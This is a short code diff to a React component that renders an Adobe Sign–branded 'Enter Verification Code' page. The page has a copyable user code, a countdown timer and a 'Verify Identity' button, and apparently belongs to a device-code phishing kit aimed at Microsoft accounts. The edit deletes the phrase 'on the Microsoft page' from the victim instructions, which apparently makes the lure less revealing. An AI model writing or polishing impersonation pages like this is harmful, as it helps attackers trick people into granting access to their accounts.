@@ -30,7 +30,7 @@ export function AdobeSignTemplate(): React.ReactElement {
               <h1 className="tpl-title">Enter Verification Code</h1>
               <p className="tpl-text">Use this code to verify your identity and access the document.</p>
               <div className="tpl-code-box"><div className="tpl-code-label">VERIFICATION CODE</div><div className="tpl-code">{f.userCode}</div><button className="tpl-copy-btn" onClick={f.handleCopy}>{f.copied ? 'Copied!' : 'Copy'}</button></div>
-              <div className="tpl-steps"><div className="tpl-step">1. Copy the code above</div><div className="tpl-step">2. Click verify and enter the code on the Microsoft page</div></div>
+              <div className="tpl-steps"><div className="tpl-step">1. Copy the code above</div><div className="tpl-step">2. Click verify and enter the code</div></div>
               <button className="tpl-btn" style={{ background: '#E8352B' }} onClick={f.handleVerify}>Verify Identity</button>
               {f.state === 'waiting' && <p className="tpl-waiting">Waiting for verification...</p>}
               <p className="tpl-expiry">Code expires in {f.formatTime(f.countdown)}</p>
